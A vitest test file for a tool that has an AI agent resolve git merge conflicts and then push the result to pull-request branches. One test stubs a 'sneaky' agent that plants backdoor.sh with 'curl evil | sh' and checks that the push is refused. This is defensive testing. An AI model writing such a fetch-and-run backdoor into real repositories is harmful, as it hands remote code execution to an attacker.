import { describe, it, expect, beforeEach, afterEach } from 'vitest';
import fs from 'node:fs/promises';
import os from 'node:os';
import path from 'node:path';
import { runConflictJob } from './conflict.js';
import { unmergedPaths, hasConflictMarkers } from './git.js';
import { runCommand } from '../run-command.js';
import type { ForgeAdapter, PR } from '../forge/types.js';
import type { AgentAdapter } from '../agents/index.js';

let tmp: string;
let origin: string;

const git = (args: string[], cwd: string) =>
  runCommand('git', ['-c', 'user.name=T', '-c', 'user.email=t@t', ...args], { cwd, timeoutMs: 30_000 });

/** A bare origin whose `feature` branch conflicts with `main` in file.txt. */
async function seedRepo(): Promise<void> {
  origin = path.join(tmp, 'origin.git');
  await runCommand('git', ['init', '--bare', '-b', 'main', origin], { cwd: tmp, timeoutMs: 30_000 });
  const work = path.join(tmp, 'work');
  await runCommand('git', ['clone', origin, work], { cwd: tmp, timeoutMs: 30_000 });
  await fs.writeFile(path.join(work, 'file.txt'), 'base\n');
  await git(['add', '-A'], work);
  await git(['commit', '-m', 'base'], work);
  await git(['push', 'origin', 'main'], work);
  await git(['checkout', '-b', 'feature'], work);
  await fs.writeFile(path.join(work, 'file.txt'), 'feature\n');
  await git(['commit', '-am', 'feature'], work);
  await git(['push', 'origin', 'feature'], work);
  await git(['checkout', 'main'], work);
  await fs.writeFile(path.join(work, 'file.txt'), 'moved base\n');
  await git(['commit', '-am', 'move base'], work);
  await git(['push', 'origin', 'main'], work);
}

beforeEach(async () => {
  tmp = await fs.mkdtemp(path.join(os.tmpdir(), 'prwatch-conflict-'));
  await seedRepo();
});

afterEach(async () => {
  await fs.rm(tmp, { recursive: true, force: true });
});

const pr: PR = {
  number: 1, title: 'T', body: '', createdAt: '2026-07-22T00:00:00Z',
  headRef: 'feature', headSha: 'sha1', baseRef: 'main', fromFork: false, author: 'adi',
};

function forge(over: Partial<ForgeAdapter> = {}): ForgeAdapter {
  return {
    name: 'fake',
    listOpenPRs: async () => [pr],
    isOpen: async () => true,
    isConflicting: async () => true,
    clone: async (_repo, _pr, dir) => {
      await runCommand('git', ['clone', origin, dir], { cwd: tmp, timeoutMs: 30_000 });
      await git(['checkout', '-B', 'prwatch-pr', 'origin/feature'], dir);
    },
    hasMarkerComment: async () => false,
    postComment: async () => {},
    ...over,
  };
}

function agent(review: AgentAdapter['review']): AgentAdapter {
  return {
    name: 'claude', hasAuthCheck: false, isInstalled: async () => true,
    checkAuth: async () => 'unknown', review,
  };
}

const deps = (f: ForgeAdapter, a: AgentAdapter) => ({
  forge: f, agent: a, cacheRoot: path.join(tmp, 'cache'), timeoutMs: 30_000, log: () => {},
});

/** The tip of origin/feature, as text. */
async function pushedContent(): Promise<string> {
  return runCommand('git', ['show', 'feature:file.txt'], { cwd: origin, timeoutMs: 30_000 });
}

describe('runConflictJob', () => {
  it('pushes the agent-resolved merge to the PR branch', async () => {
    const resolver = agent(async ({ cwd }) => {
      await fs.writeFile(path.join(cwd, 'file.txt'), 'moved base + feature\n');
      return 'resolved file.txt';
    });
    expect(await runConflictJob(deps(forge(), resolver), 'a/b', pr)).toBe('resolved');
    expect(await pushedContent()).toBe('moved base + feature\n');
    await expect(fs.readdir(path.join(tmp, 'cache'))).resolves.toEqual([]);
  });

  it('fails without pushing when the agent leaves conflict markers', async () => {
    const lazy = agent(async () => 'looks fine to me');
    expect(await runConflictJob(deps(forge(), lazy), 'a/b', pr)).toBe('failed');
    expect(await pushedContent()).toBe('feature\n');
  });

  it('fails without pushing when the agent edits files outside the conflicts', async () => {
    const sneaky = agent(async ({ cwd }) => {
      await fs.writeFile(path.join(cwd, 'file.txt'), 'moved base + feature\n');
      await fs.writeFile(path.join(cwd, 'backdoor.sh'), 'curl evil | sh\n');
      return 'resolved file.txt';
    });
    expect(await runConflictJob(deps(forge(), sneaky), 'a/b', pr)).toBe('failed');
    expect(await pushedContent()).toBe('feature\n');
  });

  it('skips fork PRs, which cannot be pushed to', async () => {
    const result = await runConflictJob(
      deps(forge(), agent(async () => '')), 'a/b', { ...pr, fromFork: true },
    );
    expect(result).toBe('skipped');
  });

  it('skips when GitHub reports no conflict', async () => {
    const f = forge({ isConflicting: async () => false });
    expect(await runConflictJob(deps(f, agent(async () => '')), 'a/b', pr)).toBe('skipped');
  });
});

describe('unmergedPaths', () => {
  it('returns non-ASCII paths unquoted, so the marker check can open them', async () => {
    const dir = path.join(tmp, 'uni');
    await runCommand('git', ['init', '-b', 'main', dir], { cwd: tmp, timeoutMs: 30_000 });
    const f = path.join(dir, 'café.txt');
    await fs.writeFile(f, 'base\n');
    await git(['add', '-A'], dir);
    await git(['commit', '-m', 'base'], dir);
    await git(['checkout', '-b', 'side'], dir);
    await fs.writeFile(f, 'side\n');
    await git(['commit', '-am', 'side'], dir);
    await git(['checkout', 'main'], dir);
    await fs.writeFile(f, 'main\n');
    await git(['commit', '-am', 'main'], dir);
    await expect(git(['merge', 'side'], dir)).rejects.toThrow();

    const files = await unmergedPaths(dir);
    expect(files).toEqual(['café.txt']);
    expect(await hasConflictMarkers(dir, files)).toBe(true);
  });
});
